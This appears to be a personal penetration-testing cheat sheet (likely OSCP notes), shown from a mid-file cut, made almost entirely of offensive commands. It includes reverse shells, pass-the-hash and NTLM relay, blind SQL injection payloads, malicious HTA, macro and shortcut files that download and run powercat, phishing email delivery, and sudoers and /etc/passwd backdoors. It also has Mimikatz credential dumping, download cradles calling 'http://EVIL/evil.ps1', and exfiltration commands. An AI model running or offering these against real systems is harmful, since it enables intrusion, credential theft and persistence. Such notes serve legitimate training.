wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/

updog -p 8090

# my tool
fuzzy-httpserver -d /opt/transfers/ -p 800
```
### 🚪Initial Access
```shell
smbclient //192.168.50.212/secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
# --option='client min protocol=core' core/NT1/SMB2  to downgrade smb version client to check compatibility
# Certain enumeration features work only in SMB1

netexec smb <ip-range> -u user.txt -p pass.txt --continue-on-success
netexec winrm <ip-range> -u user.txt -p pass.txt --continue-on-success
netexec rdp <ip-range> -u user.txt -p pass.txt -d corp.com --continue-on-success --screenshot --screentime <time> # --nla-screenshot
# no bruteforce for pass spraying
--no-bruteforce --continue-on-success


# format of hashes "LMHash:NTHash" if LMhash isn't available then 32 0's
# with admin right, gives SYSTEM account access due to service running under system account
# Process: login to writable SMB share and upload the binary, Creates service to run that binary through RPC in order to get interactive shell 
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Domain.com/Administrator@192.168.50.21 
impacket-psexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21   # Tested, it works
# wmiexec.py leverages WMI over DCOM to execute commands, avoiding the need to create a new service on the target system.
# Means more stealthier than psexec
impacket-wmiexec -hashes :7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.21

netexec smb 192.168.50.21 -u Administrator -H 7a38310ea6f0027ee955abed1762964b
netexec smb 192.168.50.21 -u 'WORKGROUP\Administrator' -H 7a38310ea6f0027ee955abed1762964b
# for NTLM relay attack
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..."

# RDP using
remmina    
xfreerdp3 /u:'CORP\Administrator' /p:'password' /v:192.168.50.246 /dynamic-resolution +clipboard
xfreerdp3 /u:stephanie /d:corp.com /v:192.168.50.75  /dynamic-resolution +clipboard
xfreerdp3 /u:'CORP\Administrator' /pth:'ntlmhash' /v:192.168.50.246 /dynamic-resolution +clipboard

# Reverse Shell
nc -nlvp 4444
# try well known ports like 80
nc -nlvp 80 # in case something might be blocked
penelope port # for more stable shell but if it doesn't work then use netcat
socat -d -d TCP-LISTEN:4444 STDOUT

# Very stable in non-interactive environment
busybox nc <ip> <port> -e /bin/sh


ssh user@192.168.0.10 "bash --noprofile --norc"
ssh -i root_key -oPubkeyAcceptedKeyTypes=+ssh-rsa -oHostKeyAlgorithms=+ssh-rsa root@MACHINE_IP

evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/home/foo/ps1_scripts/' -e '/home/foo/exe_files/'

powercat -c 192.168.119.3 -p 4444 -e powershell
runas /user:backupadmin cmd


RunasCs.exe user1 password1 "cmd /c whoami /all"

. .\Inoke-RunasCS
Invoke-RunasCs -Username svc_mssql -Password trustno1 -Command "whoami"

# ALSO CHECK [[#Lateral Movement in AD]]
```
### Extras
```shell
webshells

villain # for shell management
```

## Attacker From Windows
```powershell
# DNS Enumeration
nslookup -type=TXT example.com 8.8.8.8
# bruteforce subdomain
Get-Content subdomains.txt | ForEach-Object { $sd="$_.example.com"; if ((nslookup $sd 2>$null) -match "Name:\s+$sd") { Write-Host "[+] $sd" } }

# Port Scanning
Test-NetConnection -Port 445 192.168.50.151
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.50.151", $_)) "TCP port $_ is open"} 2>$null

# SMB Enumeration
net view \\dc01 /all # where dc01 is the hostname
net use \\machine_name 

# Tools delivery
dism /online /Enable-Feature /FeatureName:TelnetClient # to install microsoft version of telnet but requires administrative privs
# we can transfer windows binary from our machine

```
## 🕸 Web Attack

```shell
# Exploitation
# sometimes browser can't show some file so use curl e.g. just an example
curl --path-as-is http://ip:port/../../../../../test.txt


# Blind SQLI - Boolean Based
# Payload: admin' AND BINARY SUBSTRING((SELECT password FROM users WHERE username = 'admin'),FUZZ_INDEX,1) = 'FUZZ_CHAR';#---
ffuf -c --request-proto http -request login.req -w <(seq 32):FUZZ_INDEX -w <(python -c 'import string; print("\n".join([x for x in string.ascii_letters + string.digits]))'):FUZZ_CHAR -fr 'Invalid password!' -o ffuf.json

# Blind SQLI - Time Based
# Payload: admin' AND IF (SUBSTRING(@@version, FUZZ_INDEX, 1) = FUZZ_CHAR, sleep(3),'false');#---
ffuf -c --request-proto http -request search.req -w <(seq 6):FUZZ_INDEX -w <(python -c 'import string; print("\n".join([x for x in string.digits]))'):FUZZ_CHAR -enc FUZZ_CHAR:urlencode    -o ffuf.json

payload="select%20group_concat(%20distinct%20table_name,':')%20from%20information_schema.columns" # we can use that var in below urldecoded: "select group_concat( distinct table_schema,':') from information_schema.columns" 
ffuf -u "http://192.168.227.16/blindsqli.php?user=offsec'%20and%20if(SUBSTRING((select%20database()),FUZZ_INDEX,1)='FUZZ_CHAR',sleep(3),false)%20--%20-" -w <(seq 32):FUZZ_INDEX -w <(python -c 'import string; print("\n".join([x for x in string.ascii_letters + string.digits+",:"]))'):FUZZ_CHAR -mt '>5000' -o test_ffuf.json
# sort -un and uniq can be used in case of repetitive characters

# for checking the result of this json file
cat ffuf.json | jq '.results[].input | .FUZZ_INDEX+" "+.FUZZ_CHAR' -r | sort -n | awk '{print $2}' | tr -d '\n'
# for more indepth: [Manual Exploit Blind SQLi](https://medium.com/@opabravo/manually-exploit-blind-sql-injection-with-ffuf-92881a199345)


# phpinfo.php
# Loaded environment variables to find leaked API keys
# version of exploit finding
# DOCUMENT_ROOT & include_path for LFI
```

## 🧑 Client Side Attack
> [evil_macro.py](https://github.com/rodolfomarianocy/Evil-Macro/)
> [malicious-pdf.py](https://github.com/jonaslejon/malicious-pdf)
> [MMG-LO](https://github.com/0bfxgh0st/MMG-LO)

```shell
# create a malicious HTA with msfvenom
msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f hta-psh -o file.hta

# generate a malicious macro for a reverse shell in powershell using base64 for .doc
python evil_macro.py -l <ip> -p <port> -o macro.txt

# generate a malicious PDF file
python3 malicious-pdf.py burp-collaborator-url

# generate a malicious odt file
python mmg-odt.py windows <ip> <port>
```

### Microsoft Windows Library File
[Library File Schema](https://learn.microsoft.com/en-us/windows/win32/shell/library-schema-entry)
Filename: config.Library-ms
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://192.168.45.237</url> <!-- webdav ip -->
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```

Host a malicious windowss shortcut file in that webdav directory that will gonna give us back the reverse shell.
```shell
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/webdav/
```
Shortcut file content
```shell

powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.5:8000/powercat.ps1'); powercat -c 192.168.45.175 -p 4444 -e powershell"

```

Upload malicious pdf, docx, odt, Library-ms file to SMB or send to email.
```shell
sudo swaks -t dave.wizard@supermagicorg.com --from test@supermagicorg.com -ap --attach @config.Library-ms --server 192.168.227.199 --body @body.txt --header "Subject: Problems" --suppress-data

# or use
evolution
```

For More, Check Out: [[Code & Exploit Cheatsheet]]
## 🐧 <font color="#fac08f">Victim Linux Commands</font>
### For more 
- [linux privesc basic](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [PayloadAllthethings LinuxPrives](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
### Stabilizing shell
```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo && fg

export TERM=xterm
export SHELL=bash
stty rows <num> columns <num>
stty size

# whenever you run any exploit and getting no output then try getting back the connection on another listener
c:\xampp\nc.exe 192.168.45.244 9999 -e powershell.exe

# in case command not found occur in windows then

set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;

```
### 🔍Enumeration
```shell
sudo updatedb
locate <file> # to locate any file

id
cat /etc/passwd
hostname  # gives hint of the purpose of the machine
env 
```
#### User & Operating System
```shell
cat /etc/issue
cat /etc/*-release
cat /proc/version
arch
uname -r 
uname -a
id
# example:  Ubuntu 16.04.3 LTS (kernel 4.4.0-116-generic) on the x86_64 architecture
searchsploit "linux kernel Ubuntu 16 Local Privilege Escalation"   | grep  "4." | grep -v " < 4.4.0" | grep -v "4.8"
linux-exploit-suggestor-2019.sh # works great whereas latest one missed some of them

hostnamectl
```
#### Network
```shell
ifconfig / ip a
routel / route
netstat -ano  /  ss -anp
/proc/net/tcp  # use github [proc_net_parser](https://github.com/nikn0laty/proc_net_parser) Tool
resolvectl status # to check for dns settings
nslookup -type=txt domain <dnsserverip>


# Firewall rules 
iptables # requires root perms instead we can read files
/etc/iptables # use by sytem to restore netfilter rules at boot time
cat /etc/iptables/rules.v4


# network traffic but requires sudo for raw socket packet capture
sudo tcpdump -i lo -A | grep "pass"
sudo tcpdump -i <interface> -s 0 -w capture.pcap
```
#### Cronjobs
```shell
/etc/cron.*
crontab -l   # current user cron jobs
crontab -u user -l
sudo crontab -l # gives root user cron jobs
/var/log/cron.log  # logs of running cronjobs
grep "CRON" /var/log/syslog
/var/spool/cron/crontabs/   # all crontabs in one place but sudo requires

ls /etc/cron*
./pspy64

# tar wildcard exploit
echo "" > "--checkpoint-action=exec=sh exploit.sh" 
echo "" > '--checkpoint=1'

# exploit can be revshell or
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```
#### Misconfigured Permissions
```shell
# FILES
find / -writable -type d 2>/dev/null

# SUID files
find / -perm -u=s -type f 2>/dev/null   #  GTFObins
# SUID or SGID
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null

# linux capabilities
/usr/sbin/getcap -r / 2>/dev/null  # cap_setuid+ep

# [app armor](https://apparmor.net/) status 
sudo aa-status # sudo perms requires
/etc/apparmor.d  # all the profiles gets listed here
# to remove any binary profile from apparmor
sudo apparmor_parser -R /etc/apparmor.d/usr.sbin.tcpdump  # for example, and then remove that file and reload using systemctl apparmor


# sudo perms
sudo -l
sudo -u user cmd
sudo -i  # to login as root

```
#### Drives, devices and packages
```shell
# drives
mount
cat /etc/fstab
lsblk
df -h

# device drivers or kernel modules
lsmod
/sbin/modinfo <modulename_from_above_command>

#pkg mgmt
dpkg -l
rpm
```
#### Processes & services
```shell
# processes
ps aux
./pspy64
watch -n 1 "ps -aux | grep pass"  
mount | grep proc     # NOT TESTED: look for hidepid=2 for hidden process then use pspy


# running services
systemctl list-units --type=service --state=running
service --status-all



```
#### Searching Commands
```shell
# Find Commands
find . -name flag1.txt
find / -mtime 10 # modified in the last 10 days
find / -atime 10  # accessed
find / -amin -60 # accessed min
find / -cmin -60 # changed mins
-size +50M 
find / -writable -type d # world writable dirs
```
#### 🗄 Imp Files
- [Linux Sensitive files](https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt)
```shell
env
.bashrc
.bash_history

/etc/hosts 
/etc/resolv.conf
/var/lib/apache2/
/etc/apache2/sites-enabled/000-default.conf
/etc/ssh/sshd_config
/etc/init.d/knockd  # to find out the path of conf
/etc/iptables/rules.v4
/etc/freeswitch/autoload_configs/event_socket.conf.xml
/etc/exports
/etc/redis/redis.conf

/var/lib/grafana/grafana.db

/opt 
/mnt

# Different ssh keys name
/home/user/.ssh/id_rsa
id_ecdsa
id_ed25519
id_dsa
id_ecdsa_sk 
id_ed25519_sk


/usr/share/tomcat9/etc/tomcat-users.xml

/proc/cpuinfo
/proc/devices
/proc/meminfo
/proc/net/tcp
/proc/net/udp
/proc/self/cmdline
/proc/self/environ
/proc/self/mounts
/proc/self/stat
/proc/self/status
/proc/version
```

### 📂File Transfer (Download)

[More file transfer techniques](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques)

```shell
wget http://ip:port -O /dir/file
wget ip:port -O /dir/file

curl -O http://<ip>:<port>/<file>

# in case of ssh
scp -O -i priv_key kali_file user@IP:/victimpath # -O for backward compatibility
```
#### (Upload) - Exfiltration
```shell
curl --data @file.txt http://<ip>:8000/mydump.txt
curl --data "username=admin&password=1234" http://<ip>:8000/mydump.txt
wget --method=POST --body-file=<file_path> http://ip:port/outfile
# in case of ssh
scp
```

### ⬆ PrivEsc Vectors
```shell

# Check Linux PrivEsc Methodology: [[Methodology For OSCP#🛠️ Privilege Escalation Vectors#🐧 Linux]] 

# for automated priv esc vectors finding
chmod +x linpeas.sh && ./linpeas.sh | tee filename.txt 

# if /etc/passwd writable then
mkpasswd -m sha-512 newpasswordhere  # same as below 
openssl passwd w00t   # generate passwd file hash 
echo 'root2:$1$jHnmMC8j$eIN3rfj8J9NaKYjKLwt9M/:0:0:root:/root:/bin/bash' >> /etc/passwd


su
# if /etc/shadow readable
unshadow passwd.txt shadow.txt > passwords.txt # now crack it

# SUDO LD_PRELOAD
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find


# SUID binary gtfobins

# [linux capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html)


# sudoers file perms
echo 'kali ALL=(root) NOPASSWD: ALL' > /etc/sudoers
echo 'kali ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers

# SUID Binaries
# shared object injection within SUID and SGID binary
strace /usr/local/bin/suid-binary 2>&1 | grep -iE "open|access|no such file"
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c  # add the malicious so in place of missing


# ABUSING SHELL FEATURES
# In Bash versions <4.2-048, export functions to run instead of original executables
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service

# PATH Hijacking
# If a program (e.g. an SUID binary) invokes tools like `cat`, `ls`, or `ps` without full paths,
# you can place your malicious binary earlier in $PATH or manipulate $PATH variable and gain code execution under escalated privileges.

# Example: hijacking an SUID wrapper that runs `cat`
mkdir /tmp/attack && cd /tmp/attack
echo 'exec /bin/sh' > cat
chmod +x cat
export PATH="/tmp/attack:$PATH"
# Now when the SUID binary runs `cat`, it executes your shell as root

# – Relative or unsanitized path usage in SUID/root scripts: placing tools in CWD or early in $PATH can hijack exec calls :contentReference[oaicite:0]{index=0}

# – Cron jobs or services invoking commands by name: if they use PATH and run as root, dropping malicious versions in a writable dir in PATH can hijack them :contentReference[oaicite:1]{index=1}

# – LD_PRELOAD hijacking: placing evil shared libs in LD_LIBRARY_PATH when root-set-exec runs dynamic binaries

# – Library hijacking: placing .so in writable library dirs or . relative CWD before system libs


# NFS Share, if root squashing is disabled
# Files created via NFS inherit the remote user's ID. If the user is root, and root squashing is enabled, the ID will instead be set to the "nobody" user.
cat /etc/exports

# on our kali machine
showmount -e target_ip
mkdir /tmp/nfs  
mount -o rw,vers=3 <target_ip>:/target_share /tmp/nfs


# lxd/lxc and docker group priv esc
#
# [lxc/lxd Exploit](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation?q=#method-2)
# [Docker group and more interesting groups](https://angelica.gitbook.io/hacktricks/linux-hardening/privilege-escalation/interesting-groups-linux-pe#docker-group)
# More
# [priv esc using docker/lxd](https://materials.rangeforce.com/tutorial/2019/12/07/Privilege-Escalation-Docker-LXD-Groups/)


# Service Escalation
find /etc -type f -writable 2>/dev/null
/etc/systemd/system/pythonapp.service


# SSH authorized keys (Check using nmap what type of ssh-hostkey SSH server will gonna accept)
# On the basis of ssh-hostkey change rsa,ecdsa and so on
ssh-keygen -t rsa -b 4096 -f my_backdoor -N "" # on kali
# on victim
echo "ssh-rsa AAAA...yourkey... attacker@host" >> ~/.ssh/authorized_keys
# OR
echo "$(cat my_backdoor.pub)" >> .ssh/authorized_keys'
```
## 🪟 <font color="#92cddc">Victim Windows Commands</font>

- [Downloading malicious files on victim machine](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)
- Windows Enumeration tools https://github.com/r3motecontrol/Ghostpack-CompiledBinaries

### 🔍Enumeration
```powershell
# CMD or powershell
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell

Get-ExecutionPolicy -Scope CurrentUser
Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser
set-executionpolicy -ep bypass
powershell.exe -ep Bypass -c ""

# Automated Enumeration Tools 
jaws-enum.ps1 -OutputFileName Jaws-Enum.txt   # [GitHub repo](https://github.com/411Hall/JAWS)
winpeas
seatbelt.exe -group=all 

# /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1  in linux
. .\powerup.ps1
Invoke-AllChcks
Get-ModifiableServiceFile
Get-ServiceUnquoted
Get-ModifiableScheduledTaskFile
```
#### User & System info
```powershell
echo %USERNAME% && whoami && $env:username
dir env:
whoami /groups
whoami /priv
whoami /user
net user
Get-LocalUser
wmic useraccount get name,sid
net localgroup
Get-LocalGroup
Get-LocalGroupMember groupname
systeminfo
wmic os get version
Get-PSDrive

# environment variable
Get-ChildItem/dir Env:
set
reg query "HKEY_USERS\<UserSID>\Environment"  # to query user specific env vars


# Check if credential guard enabled, if yes then lsass dumping isn't possible at all using mimkatz
Get-ComputerInfo # DeviceGuardSecurityServicesRunning is CredentialGuard
# but still we can dump ntlm hashes of local users, not domain users

# for getting arch info
echo $env:PROCESSOR_ARCHITECTURE

# ENUMERATION for kernel exploits (RISKY!)
systeminfo
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
# [For Patch finding](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-29360) If CVE isn't patched then we can exploit
ver
wmic qfe get Caption,Description,HotFixID,InstalledOn

# AV service
sc query windefend


# On kali machine, to find any kernel exploit
wes systeminfo.txt -o vulns.csv
wes systeminfo.txt --exploits-only --hide "Internet Explorer" Edge Flash
wes.py -m missing.txt
```
#### Networking
```powershell
ipconfig /all # imp: for pivoting
route print
netstat -ano

Get-NetTCPConnection

```
#### Installed apps
```powershell
# enumerating installed apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
Get-Package | Sort-Object Name
wmic product get name,version
Get-AppxPackage | Select-Object Name, Version
# look for c:\ProgramFiles and Downloads folder
```

#### Powershell Files
```powershell
# Powershell sensitive info
Get-History
(Get-PSReadlineOption).HistorySavePath  
# starting v5, v5.1, and v7 of powershell includes psreadline feature and clear-history doesn't clean that history
# C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
# check for powershell transcripts file too
# Event Viewer:  Microsoft\Windows\Powershell\Operational -> Event ID 4103, 4104

# to check any suspicious one
Get-EventLog -LogName 'Windows Powershell'  | select-object * | findstr /i HostApplication | sort-object -Unique

Get-EventLog -LogName 'Windows Powershell' | ? {$_.Message -like '*Registry*'} | select-object *
```
#### Running Processes
```powershell
# Running processes to know which apps are running
Get-Process
Get-Process | Select-Object -Property Name, Path
tasklist
# to get the integrity level of any process we can use [NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/1.1.33)
Import-Module NtObjectManager
Get-NtTokenIntegrityLevel  # for current process

tasklist /FI "PID eq 3420"
tasklist | findstr /i "sync"
Get-Process | Where-Object { $_.ProcessName -like "*sql*" }

# User's integrity level
whoami /groups
# process integrity level using 
process explorer
# file integrity level and DACL test using
icacls
get-acl | Select-Object -expandproperty Access

```
#### Windows Services
```powershell
# WINDOWS SERVICES
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
# Non-admin users get "permission denied" errors with `Get-CimInstance` or `Get-Service` over network logons (e.g., WinRM); use interactive logon like RDP to bypass this.
Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'servicename'}
Get-CimInstance -ClassName Win32_Service | select Name,PathName,State,StartMode | ? {$_.PathName -notlike "C:\Windows\*" -and $_.State -contains "running"}

# for unquoted service path
Get-CimInstance -ClassName Win32_Service | Select Name, State, PathName|  Where-Object { $_.PathName -notlike '*"*"*' -and $_.PathName -match " "  -and $_.PathName -notlike 'C:\WINDOWS*'}
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """

Get-CimInstance -ClassName Win32_Service | ? {$_.Name -like "*servicename*" } | select-object *
# to check for the start mode if it's auto then we can reboot the machine to restart the service
shutdown /r /t 0 # to reboot
start-service servicename
Stop-Service servicename
net start/stop

wmic service list brief
sc query "servicename"
sc qc "servicename"  # to check if the  SERVICE_START_NAME : LocalSystem then escalate it to get NT Authority\System
sc sdshow "servicename" # perms of user on service (A;;permissions;;;SID) [[Privilege Escalation#Service permissions]]
accesschk.exe /accepteula -uwqvc srvicename # but it can't properly work
# we can also use this [ps1 script](https://github.com/Sambal0x/tools/blob/master/Get-ServiceAcl.ps1) 
# to [get service acls.](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)
Get-Service

# to check the permissions on all services
accesschk.exe -cuwqv "molly.smith" * /accepteula


# For dll hijacking quick go through
objdump -x EnterpriseService.exe | grep -i dll
strings binary.exe | grep -iE '.dll'
ltrace binary # for binary hijacking

# check [[#PrivEsc Thru SERVICE]]
```
#### Scheduled Tasks
```powershell
# SCHEDULED TASKS
Get-ScheduledTask | ? {$_.Author -notlike "*Microsoft*" -and ![string]::IsNullOrWhiteSpace($_.Author)} | Select-Object TaskName, Author
# more indepth details about task
schtasks /query /tn task_uri /fo list /v  # it shows task to run
# filtering for schtasks paths
schtasks /query /v /fo LIST | Select-String "TaskName:|Run As User:|Task To Run:" | Out-String -Stream | % { $_.Trim() } | Where-Object { $_ -match "Task To Run:" -and ($_ -match "Program Files" -or $_ -match "C:\\") }

```
#### More
```powershell

# Registry Enumeration
reg query HKLM /f password /t REG_SZ /s  # /f find 'password' string in valuename and data  /s recursively
reg query "HKLM\Path\To\Key" /v ValueName
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions

(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultUserName -ErrorAction SilentlyContinue).DefaultUserName                
(Get-ItemProperty -Path "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name DefaultPassword -ErrorAction SilentlyContinue).DefaultPassword                                                                                                                         
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon"

# Drives
wmic logicaldisk

# Event logs
Get-EventLog -LogName System -Newest 10

# Firewall
netsh firewall show state

# More about [LAPS](https://angelica.gitbook.io/hacktricks/windows-hardening/active-directory-methodology/laps)
# LAPS Enumeration using [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)
# Get groups that can read passwords
Find-LAPSDelegatedGroups

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
```

#### Searching Commands
```powershell
attrib # to find hidden files

# searching through sensitive files
Get-ChildItem -Path C:\  -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx
Get-ChildItem -Path C:\xampp -File -Recurse -ErrorAction SilentlyContinue -Include *.txt,*.log,*.docx,*.pdf,*.docx,*.ini,*.config,*.xml
Get-ChildItem -Path C:\Users\ -File -Recurse -ErrorAction SilentlyContinue -Include *.kdbx, *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.conf,*.xml,*.json,*.db,*.log,*.ini,*.config,*.xml 

dir -Hidden -File -Recurse -ErrorAction SilentlyContinue -Include ConsoleHost_history.txt

$users = @('Administrator.OSCP','Administrator','celia.almeda','eric.wallows','Mary.Williams','web_svc','support')
ForEach($var in $users){ 
 dir "C:\Users\$var\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
 type "C:\Users\$var\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

}
# searching for sensitive strings
findstr /S /I /M "your_search_string" *.*
findstr "password" config.ini
findstr /s /i "admin" *.txt      :: /s = recursive, /i = ignore case
findstr /r "^ERROR" log.txt      :: /r = regex
findstr /si password _.txt |_ .xml | *.ini

# powershell variant
Select-String -Pattern "pattern" -Path filename.txt
sls "pattern" file.txt
sls "pattern"

# specific files
dir /s sysprep.inf sysprep.xml unattended.xml unattend.xml unattended.txt 2>null
type C:\xampp\passwords.txt | type C:\xampp\mysql\bin\my.ini
```
#### 🗄 Imp Files
- [Sensitive Files Location in Windows](https://github.com/InfoSecWarrior/Offensive-Payloads/blob/main/Windows-Sensitive-Files.txt)
- [Comprehensive One](https://github.com/soffensive/windowsblindread/blob/master/windows-files.txt)
- [LFI Wordlist](https://github.com/DragonJAR/Security-Wordlist/blob/main/LFI-WordList-Windows)
```powershell
C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
C:\Windows\System32\drivers\etc\hosts
C:\Windows\Panther\Unattend.xml
C:\windows.old\Windows\System32\SAM
C:\windows.old\Windows\System32\SYSTEM
C:\xampp\mysql\bin\my.ini
C:\xampp\passwords.txt


C:\ProgramData\Microsoft\Group Policy\history 
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history
Groups.xml
Services.xml
Scheduledtasks.xml
DataSources.xml
Printers.xml
Drives.xml
```
### Mimikatz
```powershell
privilege::debug    # to enable SeDebugPrivilege for getting access to other user process like lsass (SYSTEM user)   1
token::elevate   # to elevate privileges to SYSTEM user NEEDED       2
sekurlsa::logonpasswords   # extract password from all sources like LSASS for domain user hashes
lsadump::sam   # only dumps from SAM database for local user account hashes

# if credential guard enabled and wanna extract Domain users credentials
misc::memssp    # but now wait till a domain user logs in and our SSP used as an auth process to catch plaintext pass
# credentials stored in C:\Windows\System32\mimilsa.log

dir \\serviceserver\share  # to cache kerberos ticket
sekurlsa::tickets

# Impacket Secretsdump can be used to dump in the AD
impacket-secretsdump -just-dc-ntlm test.local/john:password123@10.10.10.1
```
We can find an excellent reference guide [here](https://adsecurity.org/?page_id=1821).
In case of Antivirus, execute Mimikatz directly from memory using an injector like [PowerShell](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1), or use a built-in tool like Task Manager to dump the entire [LSASS process memory](https://www.whiteoaksecurity.com/blog/attacks-defenses-dumping-lsass-no-mimikatz/), move the dumped data to a helper machine, and then load the data into [Mimikatz](http://www.fuzzysecurity.com/tutorials/18.html).
##### AV enabled machine
Mimikatz version to use in AV enabled machine [GitHub Repo](https://github.com/okankurtuluss/Invoke-Mimikatz-Bypass)
### 📂File Transfer (Download)

[More file transfer techniques](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/file-transfer-techniques)

```powershell
# Download Cradles
IEX (New-Object Net.Webclient).downloadstring("http://EVIL/evil.ps1")
# PowerShell 3.0+
IEX (iwr 'http://EVIL/evil.ps1')

iwr -uri http://192.168.48.3/winPEASx64.exe -Outfile winPEAS.exe

powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.31.141/ignite.txt', 'ignite.txt')

certutil -urlcache -split -f http://192.168.31.141/ignite.txt ignite.txt # -split for splitting large files
bitsadmin /transfer job http://192.168.31.141/ignite.txt C:\Users\Public\ignite.txt

copy \\192.168.31.141\share\ignite.txt .  # for smb data download

```
#### (Upload) - Exfiltration
```powershell
$uri = "https://www.example.com/submit"
$body = "param1=value1&param2=value2" # URL-encoded form data

Invoke-WebRequest -Uri $uri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"


$filePath = "C:\path\to\your\file.txt"
Invoke-WebRequest -Uri $uri -Method POST -InFile $filePath -ContentType "application/octet-stream"

wget -Method POST -Uri http://192.168.45.x/file.exe  -InFile "./file.exe" 

curl.exe -X POST -F "file=@C:\path\to\your\file.txt" http://your-server.com/upload


net use Z: \\<SMB_SERVER_IP>\sharename
net use Z: \\<SMB_SERVER_IP>\sharename /user:USERNAME PASSWORD
copy C:\path\to\your\file.txt Z:\

# encode and copy paste
certutil -encode input.txt output.b64
```

### ⬆ PrivEsc Vectors
#### Access After Creds
```powershell
# escalation through saved creds
cmdkey /list
runas /savecred /user:admin reverse_shell.exe


# Use runas to get access as new user if we have already GUI access to machine and new user not in RDP or WinRM
runas /user:backupadmin cmd

# winrm login through powershell
$password = ConvertTo-SecureString "qwertqwertqwert123!!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("daveadmin", $password)
Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
# Recommended to connect that user from attacking machine using evil-winrm

# after having creds, can get back reverse shell having high privs
Start-Process -FilePath "powershell" -argumentlist "IEX(New-Object Net.WebClient).downloadString('http://192.168.45.194/revshell.ps1')" -Credential $cred

# shell-admin.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.7 -Port 6666

```
#### Misconfigured/Excessive Privileges 
##### SeImpersonatePrivilege (Potato Attacks) 
```powershell
# POTATO Attacks
# SeImpersonatePrivilege OR SeAssignPrimaryTokenPrivilege
.\SigmaPotato.exe <cmd>/--revshell <ip> <port>  # [github repo](https://github.com/tylerdotrar/SigmaPotato)
.\PrintSpoofer64.exe -i -c powershell
